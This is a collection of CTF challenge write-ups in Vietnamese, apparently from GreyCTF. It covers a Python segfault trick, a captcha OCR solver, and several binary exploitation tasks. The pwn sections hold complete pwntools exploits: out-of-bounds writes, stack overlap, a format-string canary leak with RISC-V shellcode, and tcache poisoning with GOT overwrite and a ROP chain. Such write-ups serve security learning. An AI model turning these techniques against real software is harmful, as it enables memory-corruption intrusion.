# Crash Python (misc)

```
payload = 'jnqpsu!pt<jnqpsu!tjhobm<pt/ljmm)pt/hfuqje)*-!tjhobm/TJHTFHW*'
payload = "".join([chr(ord(_)-1) for _ in payload]) open("stage2.py", "w").write(payload)
import stage2
```

- tham khảo

```
https://gist.github.com/coolreader18/6dbe0be2ae2192e90e1a809f1624c694
https://codegolf.stackexchange.com/questions/4399/shortest-code-that-raises-a-sigsegv
```

# Gotcha (misc)

```python
import requests
import pytesseract
import base64
from bs4 import BeautifulSoup
from PIL import Image, ImageOps
import io

url = "http://localhost:1337/"
submit_url = "http://localhost:1337/submit"

# pytesseract.pytesseract.tesseract_cmd = r'/mnt/d'
s = requests.session()
for i in range(1):
    req = s.get('http://localhost:1337/')

    req_html = (req.text)                                       #lay html
    start_index = req_html.find('base64,') + len('base64,')     #lay base64 cua captcha
    end_index = req_html.find('" alt=')
    base64_data = req_html[start_index:end_index]
    image_data = base64.b64decode(base64_data)                  #decode base 64
    img = Image.open(io.BytesIO(image_data))
    data = pytesseract.image_to_string(
        img, config='--psm 6 --oem 3 -l eng -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ')[:-2]    #doc hinh anh

    captcha = {
        'captcha': data
    }

    r = s.post(submit_url, data=captcha)                        #gui hinh anh
    html_content = r.content                                    #lay html
    soup = BeautifulSoup(html_content, "html.parser")           #lam cho no dep hon =)))
    text_score = soup.h3.text.strip()                           #lay <h3>
    print(text_score)

    if (text_score.find("100") != -1):
        print(soup)
        break
# https://ctftime.org/task/17320
```

# monkey type

## Source

<details> <summary> Source </summary>

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  char ch_0; // [rsp+3h] [rbp-9Dh]
  int idx; // [rsp+4h] [rbp-9Ch]
  uint64_t highscore; // [rsp+8h] [rbp-98h]
  WINDOW *mainwin; // [rsp+10h] [rbp-90h]
  timespec start; // [rsp+20h] [rbp-80h] BYREF
  timespec stop; // [rsp+30h] [rbp-70h] BYREF
  struct timespec remaining; // [rsp+40h] [rbp-60h] BYREF
  char buf[64]; // [rsp+50h] [rbp-50h] BYREF
  unsigned __int64 v13; // [rsp+98h] [rbp-8h]

  v13 = __readfsqword(0x28u);
  idx = 0;
  highscore = 0LL;
  mainwin = init();
  memset(buf, 0, sizeof(buf));
  update_cursor(0);
  nodelay(stdscr__NCURSES6_TINFO_5_0_19991023, 1);
  while ( ch_0 != 113 )
  {
    if ( highscore > 0xFFFFFFFF )
    {
      endwin();
      puts("You win! Here's the flag:");
      puts("grey{XXXXXXXXXXXXXXX}");
      exit(0);
    }
    ch_0 = wgetch(stdscr__NCURSES6_TINFO_5_0_19991023);
    if ( ch_0 != -1 )
    {
      if ( ch_0 == 0x7F )
      {
        update_text(mainwin, buf, --idx);
      }
      else if ( ch_0 > 0x1F )
      {
        if ( !idx )
          clock_gettime(0, &start);
        if ( idx <= 0x20 )
        {
          v3 = idx++;
          buf[v3] = ch_0;
          update_text(mainwin, buf, idx);
        }
        if ( !strcmp(buf, quote) )
        {
          clock_gettime(0, &stop);
          highscore = get_score(&start, &stop);
          update_highscore(mainwin, highscore);
          memset(buf, 0, sizeof(buf));
          idx = 0;
          update_text(mainwin, buf, 0);
          update_cursor(0);
        }
      }
    }
    remaining.tv_sec = 0LL;
    remaining.tv_nsec = 16666666LL;
    nanosleep(0LL, &remaining);
  }
  return 0;
}
```

</details>

## Ý tưởng

- wu tham khảo [link ở đây](https://gerrardtai.com/coding/greyctf#monkeytype)

- Đầu tiên, chương trình sẽ cho ta flag khi `highscore > 0xffffffff`
- Trong vòng lặp ta thấy chương trình đang xử lí các kí tự ta nhập vào, ở đây

```c
if ( ch_0 == 0x7F )
      {
        update_text(mainwin, buf, --idx);
      }
```

- khi `ch_0 == 0x7F` chương trình sẽ giảm idx xuống mà không kiểm tra giá trị idx có lớn hơn 0 không, chức năng update_text sẽ ghi lên stack, vậy ta có lỗi Out-of-bound

## Khai thác

```
char buf[64]; // [rsp+50h] [rbp-50h] BYREF
uint64_t highscore; // [rsp+8h] [rbp-98h]
```

```python
#!/usr/bin/python3

from pwn import *

exe = ELF('monkeytype', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('34.124.157.94', 12321)
else:
        p = process(exe.path)

GDB()
s(b' '*0x48)    # 0x98 - 0x50
s(b'A'*5)
# output = p.recvall()
# print(output[output.index(b'flag:\n'):])
p.interactive()
```

# READ ME A BOOK

## Source

<details> <summary> source </summary>

```c
void __fastcall catflag(int a1)
{
  FILE *stream; // [rsp+18h] [rbp-18h]
  __int64 size; // [rsp+20h] [rbp-10h]
  void *ptr; // [rsp+28h] [rbp-8h]

  if ( a1 == 1337 )
  {
    stream = fopen("books/flag.txt", "rb");
  }
  else
  {
    if ( a1 > 1337 )
      goto LABEL_16;
    if ( a1 == 4 )
    {
      stream = fopen("books/not_a_flag.txt", "rb");
    }
    else
    {
      if ( a1 > 4 )
        goto LABEL_16;
      switch ( a1 )
      {
        case 3:
          stream = fopen("books/youtiaos_recipe.txt", "rb");
          break;
        case 1:
          stream = fopen("books/bee_movie.txt", "rb");
          break;
        case 2:
          stream = fopen("books/star_wars_opening.txt", "rb");
          break;
        default:
          goto LABEL_16;
      }
    }
  }
  if ( !stream )
  {
LABEL_16:
    puts("We don't have that book!");
    return;
  }
  fseek(stream, 0LL, 2);
  size = ftell(stream);
  ptr = calloc(1uLL, size + 1);
  fseek(stream, 0LL, 0);
  fread(ptr, size, 1uLL, stream);
  puts(" ---------------------------------");
  puts("The story goes...");
  puts((const char *)ptr);
  puts(" ---------------------------------");
  fclose(stream);
  free(ptr);
}

__int64 option1()
{
  int v1[11]; // [rsp+Ch] [rbp-34h] BYREF
  unsigned __int64 v2; // [rsp+38h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("\nWhich book would you like to read?");
  puts("1. Bee Movie Script");
  puts("2. Star Wars Opening");
  puts("3. Recipe to make the best Youtiaos");
  puts("4. The Secret to Life");
  printf("> ");
  if ( (unsigned int)__isoc99_scanf("%d", v1) && v1[0] == 1337 )
  {
    puts("\nLibrarian: Hey! This book is not for your eyes!");
    handler((int)"\nLibrarian: Hey! This book is not for your eyes!");
  }
  delete();
  return (unsigned int)v1[0];
}

unsigned __int64 option2()
{
  void *buf; // [rsp+0h] [rbp-40h]
  unsigned __int64 v2; // [rsp+38h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  buf = malloc(0x1000uLL);
  printf("Leave us your feedback: ");
  read(0, buf, 0xFFFuLL);
  puts("Thanks! Our librarians will have a look at your feedback.");
  dword_402C = 1;
  free(buf);
  return v2 - __readfsqword(0x28u);
}

void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int v3; // [rsp+0h] [rbp-10h] BYREF
  int v4; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  sub_159D(a1, a2, a3);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      __isoc99_scanf("%d", &v3);
      delete();
      if ( v3 != 1 )
        break;
      v4 = option1();
      catflag(v4);
    }
    if ( v3 != 2 )
    {
      puts("Goodbye!");
      exit(0);
    }
    if ( dword_402C )
      puts("You have already given your feedback.");
    else
      option2();
  }
}
```

</details>

## Ý tưởng

- Bài này lỗi chồng chéo stack
- Lỗi ở đây khi debug dừng chỗ `read(0, buf, 0xFFFuLL);` của option2 thì ta thấy giá trị trả về của read() là số byte read() đọc được vào rax() (giả sử trường hợp này mình nhập vào 0x538 byte "a" + 1 endline)
  ![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/4018952d-f7b2-400c-9382-a3025879e467)
- và câu lệnh asm tiếp theo là ` mov    DWORD PTR [rbp-0x34], eax` đưa số byte này vào `$rbp-0x34` mà ở option1 ta có `  int v1[11]; // [rsp+Ch] [rbp-34h] BYREF` cũng ở `rbp-0x34` đó là lỗi chồng chéo stack.

- Khi trở về hàm scanf trong option 1 ta thấy rsi của `v1[0]` đã là 1337, bây giờ chúng ta chỉ cần nhập chữ thì hàm scanf() sẽ không đọc được và không thay đổi 1337.

## Khai thác

- Đầu tiên ta chọn option 2 và gửi vào 0x539 byte, sau đó chọn option 1 và gửi vào chữ.

```python
#!/usr/bin/python3

from pwn import *

exe = ELF('chall', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('34.124.157.94', 12344)
else:
        p = process(exe.path)

GDB()
sla(b"Option: ", b"2")
sa(b": ", b"a" * 0x539)
sla(b"Option: ", b"1")
sla(b"> ", b"a")

p.interactive()


```

## Kết quả

![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/515af9c1-8542-45db-a6c5-a17ce5430d5a)

# ROPV
Link hướng dẫn [here](https://hackmd.io/@-igYKgCkR_aGfvddJjS3QA/rk0CLg6H2)
## Source
![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/a5802f02-e5db-4800-9846-a97ad0366399)
## Ý tưởng
- Lỗi bof và fmt
- Đầu tiên ta sẽ tìm stack của nó ở đâu trước đã bằng cách nhập vào 8 byte a và debug, tìm xem nó ở đâu
```c
gef➤  search-pattern aaaaaaaa
[+] Searching 'aaaaaaaa' in memory
[+] In (0x4000001000-0x4000801000), permission=rw-
  0x40007ffc80 - 0x40007ffc88  →   "aaaaaaaa[...]"
```
- Thì ta thấy với %p, nó đã leak cho ta một địa chỉ stack, để kiểm tra ta sẽ nhập vào payload "%paaaaaa", và debug tìm chuỗi thì đúng 2 địa chỉ này là stack
```
0x40007ffc80aaaaaa

gef➤  search-pattern aaaaaa
[+] Searching 'aaaaaa' in memory
[+] In (0x4000001000-0x4000801000), permission=rw-
  0x40007ffc82 - 0x40007ffc88  →   "aaaaaa[...]"
```
- Tiếp theo với %9$p ta leak được canary
- Khi này ta có
```
0x000040007ffc80│+0x0000: "%p %9$p\n"    ← $rsi, $r13, $r14
0x000040007ffc88│+0x0008: 0xd3b7dc8134258000                        #canary
0x000040007ffc90│+0x0010: 0x000000000109d0  →  0xf437e456f8227139   
0x000040007ffc98│+0x0018: 0x00000000010696  →  0x000007132f6040ef
0x000040007ffca0│+0x0020: 0x0000000000000000                       #shellcode 
0x000040007ffca8│+0x0028: 0x0000000000000001
```
## Kết quả
![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/9178c0d4-96d4-4da6-a589-30ef87028b73)

```python
#!/usr/bin/python3

from pwn import *

exe = ELF('ropv', checksec=False)

# context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


                c
                ''')
        input()


shellcode = b'\x01\x11\x06\xec\x22\xe8\x13\x04\x21\x02\xb7\x67\x69\x6e\x93\x87\xf7\x22\x23\x30\xf4\xfe\xb7\x77\x68\x10\x33\x48\x08\x01\x05\x08\x72\x08\xb3\x87\x07\x41\x93\x87\xf7\x32\x23\x32\xf4\xfe\x93\x07\x04\xfe\x01\x46\x81\x45\x3e\x85\x93\x08\xd0\x0d\x93\x06\x30\x07\x23\x0e\xd1\xee\x93\x06\xe1\xef\x67\x80\xe6\xff'
def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('')
else:
    p = process('qemu-riscv64 -g 4000 ropv'.split())

GDB()
sla(b"Echo server: ", b"%p %9$p")
stack = int(p.recvuntil(b" ", drop=True), 16)
canary = int(p.recvline(keepends=False), 16)
info("stack: " + hex(stack))
info("canary: " + hex(canary))
payload = b"a" * 8 + p64(canary) + b'a'*8+ p64(stack+32) + shellcode
sla(b"Echo server: ", payload)

p.interactive()
```

# write me a book

## Ý tưởng

- Đây là một chương trình có lỗ hổng heap, tuy nhiên ta không thể double free, hay UAF một cách đơn giản vì các option đều kiểm tra idx đó có hợp lệ không, nhưng có lỗ hổng OVERLAPPING CHUNK và TCACHE POISONING.
- Lý thuyết [OVERLAPPING CHUNK](https://hackmd.io/@-igYKgCkR_aGfvddJjS3QA/SkBZQ6iBn#Khai-th%C3%A1c)
- [TCACHE POISONING](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/tcache_poisoning.c)
- [tham khảo](https://gerrardtai.com/coding/greyctf#write-me-a-book)

## Khai thác

### Stage 1: Ow chunk để tạo tcache poisoning.

- Tạo 4 chunk (tại sao phần author-sign ta gửi `sla(b"> ", b"a"*5 + p8(0x41))` tí ta sẽ đề cập )

```python
signature = b"a"*5 + b"\x41"
sla(b"> ", b"a"*5 + p8(0x41))


write(1, b"A"*0x20)
write(2, b"B"*0x1)
write(3, b"C"*0x20)
write(4, b"D"*0x20)
```

- Khi này chunk của chúng ta sẽ trông như này
  ![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/cb962513-9a19-4b10-bb99-12d591888c6e)

- Và ta để ý sau mỗi lần write hay rewrite đều có `*v0 = author_signature;` sau tên sách, và lúc này dòng `v4 = read(0, *((void **)&unk_4040E8 + 2 * v3), *((_QWORD *)&books + 2 * v3));` sẽ tạm hiểu là `read(0,địa chỉ chunk 1, 0x30)` và sau đó nó gắn cái `author_sign` vào nhưng không hề kiểm tra size sau khi gắn author_sign vào nó có còn trong 0x30 byte không, và khi này ta thấy đã bị ow fw_pointer của chunk 2

- Bây giờ rewrite chunk 1 `edit(1, b"a" * 0x30)`, chunk 2 sẽ như này
  ![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/467d6baf-4989-442d-b6d3-74efffb0e98d)
- Chunk 2 đã thay đổi size và cập nhật lại, vì khi nhập 0x30 byte ở chunk 1 + (3 + 6) byte ở author_sign, một byte cuối cùng của author_sign, ghi đè size của chunk 2
- 0x41 byte vì hình như malloc tối đa 0x41 byte thoi
- Leak heap:

```python
def leak(idx: int) -> int:
    sla(b"Option:", b"1337")
    sla(b"What is your favourite number?", str(idx).encode("ascii"))
    p.recvuntil(b"You found a secret message: ")
    leak = int(p.recvuntil(b"\n").replace(b"\n", b"").decode("ascii"), 16)
    return leak
heap_addr = leak(3)

```

- Vậy giờ ta có thể overwrite fw_pointer của chunk 3 sau khi free(UAF)

```python
throw(4)
throw(3)
throw(2)
write(2, b"E"*0x20) #de malloc cap phat 0x41byte

fake_chunk = p64(0) + p64(0x41)  # prev_size, size chunk 3
secret_msg = 0x004040c0
fake_chunk += (p64(secret_msg ^ (heap_addr >> 12)) + #fw_pointer
    p64(0x0))  # next = secret_msg
# fake-chunk replaces chunk C's metadata & next ptr
edit(2, b"E"*0x10 + fake_chunk)
```

- Khi này trong bin sẽ như này `tcahe bin 0x40: chunk3 <== chunk4`, ta sửa fw_pointer của chunk 3, chunk 4 sẽ lấy fw_ptr đó làm địa chỉ nên, trong bin ta sẽ thấy như này
  ![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/feb9b9e6-25fd-41a3-a5d2-d6e87c90471d)

- Khi ta gọi lại 2 chunk 3 4 ra thì chunk 4 đang trỏ địa chỉ của `secret_msg`
  ![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/7519556d-53fa-4cd0-92f4-c9db0e27ebe0)
- Bây giờ ta sẽ set `secret_msg = 0`, author_sign như cũ, size book1 là 0x1000 và địa chỉ book1 là `secret_msg`

```python
fake_book = p64(0x1000) + p64(secret_msg)  # size, ptr
payload = (p64(0) * 2 +  # secret_msg
           b"by " + signature + 7 * b"\x00" +  # author_signature
           fake_book)  # books[0]
edit(4, payload)
```
### Leak libc
- Khi này book 1 là địa chỉ của msg rồi nên bây giờ ta sẽ ghi đè book 2 giữ địa chỉ của free.got, để khi rewrite book 2 thì nó sẽ nhảy vào free.got để ta có thể sửa free.plt thành puts.plt

```python
fake_book2 = p64(0x8) + p64(exe.got["free"])
bss_payload = payload + fake_book2
# writes to secret_msg. book[1] now has ptr=got['free'] & size=0x8
edit(1, bss_payload)

edit(2, p64(exe.plt["puts"]))  # overwrites free with puts
```

```
gef➤  x/30xg 0x00000000004040c0
0x4040c0 <secret_msg>:  0x0000000000000000      0x0000000000000000
0x4040d0 <author_signature>:    0x6161616161207962      0x0000000000000041
0x4040e0 <books>:       0x0000000000001000      0x00000000004040c0      #book1
0x4040f0 <books+16>:    0x0000000000000008      0x0000000000404018      #book2
0x404100 <books+32>:    0x6161616161207962      0x0000000000000041
0x404110 <books+48>:    0x0000000000000030      0x00000000004040c0
0x404120 <books+64>:    0x0000000000000000      0x0000000000000000
```

- Tiếp tục ta ow địa chỉ book 2 là puts.got, vì free() và puts() đều nhận giá trị là một địa chỉ

```python
fake_book2 = p64(0x8) + p64(exe.got["puts"])
bss_payload = payload + fake_book2
edit(1, bss_payload)
throw(2)

libc_leak = u64(p.recvline(keepends=False) + b"\0\0")
info("libc leak: " + hex(libc_leak))
libc.address = libc_leak - libc.sym['puts']
info("libc leak: " + hex(libc.address))
```

```
0x4040e0 <books>:       0x0000000000001000      0x00000000004040c0
0x4040f0 <books+16>:    0x0000000000000008      0x0000000000404030
0x404100 <books+32>:    0x6161616161207962      0x0000000000000041
0x404110 <books+48>:    0x0000000000000030      0x00000000004040c0
0x404120 <books+64>:    0x0000000000000000      0x0000000000000000
```

### Leak stack

- Tương tự như trước, ta sẽ ow free() thành printf() và sử dụng %p để leak stack
- Ow free.plt thành printf.plt

```python
fake_book2 = p64(0x8) + p64(exe.got["free"])
bss_payload = payload + fake_book2
# writes to secret_msg. book[1] now has ptr=got['free'] & size=0x8
edit(1, bss_payload)
edit(2, p64(exe.plt["printf"]))  # overwrite free with puts
```

- Hàm printf() vẫn nhận vào một địa chỉ chứa chuỗi, do đó mình bằng việc rewrite book 1 ta sẽ ghi đè địa chỉ book 2 thành địa chỉ chứa chuỗi, ở đây ta sẽ ow luôn book 3 thành "%8$p\0"

```python
fake_book2 = p64(0x8) + p64(0x404100)  # size=0x8 & ptr=book[2]
bss_payload = payload + fake_book2 + b"%8$p\0"
edit(1, bss_payload)  # writes to secret_msg. book[1] now has ptr=book[2] & size=0x8. book[2] now equals our format string.
throw(2)  # free("hello.%8$p.\0") becomes printf("hello.%8$p.\0")

stack_leak = int(p.recv(14).decode(), 16)
info("stack leak: " + hex(stack_leak))
ret = stack_leak - 24
info("ret: " + hex(ret))
```

```
gef➤  x/s 0x404100
0x404100 <books+32>:    "%8$p."
```

![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/75df207d-5e9a-4706-a781-0828a4e71cd4)

### ROP

- Do có seccomp nên không ret2libc, one_gadget cũng có vẽ không được nên ta sẽ mở đọc flag và in ra, ta chỉ cần đưa vào vùng có quyền ghi và đọc là được.

```python
book_start = 0x004040e0

fake_book2 = p64(0x200) + p64(ret)  # size=0x200 & ptr=saved_rip
bss_payload = payload + fake_book2 + b"./flag\0" # dua flag vao rw_section
# writes to secret_msg. book[1] now has ptr=saved_rip & size=0x200. book[2] now equals flag path.
edit(1, bss_payload)
POP_RDI = p64(libc.address + 0x001bc021)
POP_RSI = p64(libc.address + 0x001bb317)
POP_RDX_RBX = p64(libc.address + 0x00175548)
POP_RAX = p64(libc.address + 0x001284f0)
SYSCALL = p64(libc.address + 0x00140ffb)

flag_where = book_start + 0x10 * 10  # buffer to read the flag file into
payload = flat(
    # open("/flag", 0)
    POP_RAX, 2,
    POP_RDI, book_start + 0x10 * 2,
    POP_RSI, 0,
    SYSCALL,

    # read(3, flag_where, 0x50)
    POP_RAX, 0,
    POP_RDI, 3,
    POP_RSI, flag_where,
    POP_RDX_RBX, 0x50, 0,
    SYSCALL,

    # write(1, flag_where, 0x50)
    POP_RAX, 1,
    POP_RDI, 1,
    SYSCALL,
    # 0x0000000000401b88
)
edit(2, payload)
```

## Kết quả

![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/a932ac7f-1297-42f4-a490-03dda82df910)

```python
#!/usr/bin/python3

from pwn import *

exe = ELF('chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                # b*0x0000000000401b5b
                # b*0x00000000004016da
                # b*0x000000000040175c
                # b*0x000000000040189d
                # c
                # c
                # c
                # b*0x4016f4
                b*0x0000000000401843
                b*0x0000000000401b2e
                c
                c
                c
                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)


def leak(idx: int) -> int:
    sla(b"Option:", b"1337")
    sla(b"What is your favourite number?", str(idx).encode("ascii"))
    p.recvuntil(b"You found a secret message: ")
    leak = int(p.recvuntil(b"\n").replace(b"\n", b"").decode("ascii"), 16)
    return leak


def write(i, payload):
    sla(b"Option: ", b"1")
    sla(b"Index: ", f"{i}".encode())
    sa(b"long!\n", payload)


def throw(i):
    sla(b"Option: ", b"3")
    sla(b"Index: ", f"{i}".encode())


def edit(i, payload):
    sla(b"Option: ", b"2")
    sla(b"Index: ", f"{i}".encode())
    sa(b"before.\n", payload)


GDB()
signature = b"a"*5 + b"\x41"
sla(b"> ", b"a"*5 + p8(0x41))

write(1, b"A"*0x20)
write(2, b"B"*0x1)
write(3, b"C"*0x20)
write(4, b"D"*0x20)
heap_addr = leak(3)
edit(1, b"a" * 0x30)

throw(4)
throw(3)
throw(2)
write(2, b"E"*0x20)

fake_chunk = p64(0) + p64(0x41)  # prev_size, next_size
secret_msg = 0x004040c0
fake_chunk += p64(secret_msg ^ (heap_addr >> 12)) + \
    p64(0x0)  # next = secret_msg
# fake-chunk replaces chunk C's metadata & next ptr
edit(2, b"E"*0x10 + fake_chunk)

write(3, b"F"*0x20)  # re-allocate chunk C
write(4, b"G"*0x20)  # target chunk allocated
fake_book = p64(0x1000) + p64(secret_msg)  # size, ptr
payload = (p64(0) * 2 +  # secret_msg
           b"by " + signature + 7 * b"\x00" +  # author_signature
           fake_book)  # books[0]
edit(4, payload)

#################
### Leak libc ###
#################
fake_book2 = p64(0x8) + p64(exe.got["free"])
bss_payload = payload + fake_book2
# writes to secret_msg. book[1] now has ptr=got['free'] & size=0x8
edit(1, bss_payload)
edit(2, p64(exe.plt["puts"]))  # overwrites free with puts

fake_book2 = p64(0x8) + p64(exe.got["puts"])
bss_payload = payload + fake_book2
edit(1, bss_payload)
throw(2)

libc_leak = u64(p.recvline(keepends=False) + b"\0\0")
info("libc leak: " + hex(libc_leak))
libc.address = libc_leak - libc.sym['puts']
info("libc leak: " + hex(libc.address))

##################
### Leak Stack ###
##################
fake_book2 = p64(0x8) + p64(exe.got["free"])
bss_payload = payload + fake_book2
# writes to secret_msg. book[1] now has ptr=got['free'] & size=0x8
edit(1, bss_payload)
edit(2, p64(exe.plt["printf"]))  # overwrite free with puts

fake_book2 = p64(0x8) + p64(0x404100)  # size=0x8 & ptr=book[2]
bss_payload = payload + fake_book2 + b"%8$p\n\0"
# writes to secret_msg. book[1] now has ptr=book[2] & size=0x8. book[2] now equals our format string.
edit(1, bss_payload)
throw(2)  # free("%8$p\0") becomes printf("%8$p\0")

stack_leak = int(p.recv(14).decode(), 16)
info("stack leak: " + hex(stack_leak))
ret = stack_leak - 24
info("ret: " + hex(ret))

################
##### ROP ######
################
book_start = 0x004040e0
fake_book2 = p64(0x200) + p64(ret)  # size=0x200 & ptr=saved_rip
bss_payload = payload + fake_book2 + b"./flag\0"  # dua flag vao rw_section
# writes to secret_msg. book[1] now has ptr=saved_rip & size=0x200. book[2] now equals flag path.
edit(1, bss_payload)
POP_RDI = p64(libc.address + 0x001bc021)
POP_RSI = p64(libc.address + 0x001bb317)
POP_RDX_RBX = p64(libc.address + 0x00175548)
POP_RAX = p64(libc.address + 0x001284f0)
SYSCALL = p64(libc.address + 0x00140ffb)

flag_where = book_start + 0x10 * 10  # buffer to read the flag file into
payload = flat(
    # open("/flag", 0)
    POP_RAX, 2,
    POP_RDI, book_start + 0x10 * 2,
    POP_RSI, 0,
    SYSCALL,

    # read(3, flag_where, 0x50)
    POP_RAX, 0,
    POP_RDI, 3,
    POP_RSI, flag_where,
    POP_RDX_RBX, 0x50, 0,
    SYSCALL,

    # write(1, flag_where, 0x50)
    POP_RAX, 1,
    POP_RDI, 1,
    SYSCALL,
    # 0x0000000000401b88
)
edit(2, payload)
# sla(b"Option:", b"4")
p.interactive()
```
